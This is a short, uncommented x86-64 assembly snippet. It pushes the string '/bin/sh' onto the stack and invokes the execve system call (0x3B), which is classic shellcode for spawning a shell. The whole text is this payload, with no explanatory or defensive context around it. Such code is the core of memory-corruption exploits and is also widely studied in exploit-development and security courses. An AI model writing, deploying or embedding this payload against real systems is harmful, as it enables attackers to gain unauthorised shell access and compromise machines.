xor %rax, %rax
pushq %rax
movq %rsp, %rdx
pushq %rdx
movq %rsp, %rsi
movq %rsp, %rdx
movq $0x0068732f6e69622f, %rax
pushq %rax
movq %rsp, %rdi
movq $0x3B, %rax
syscall
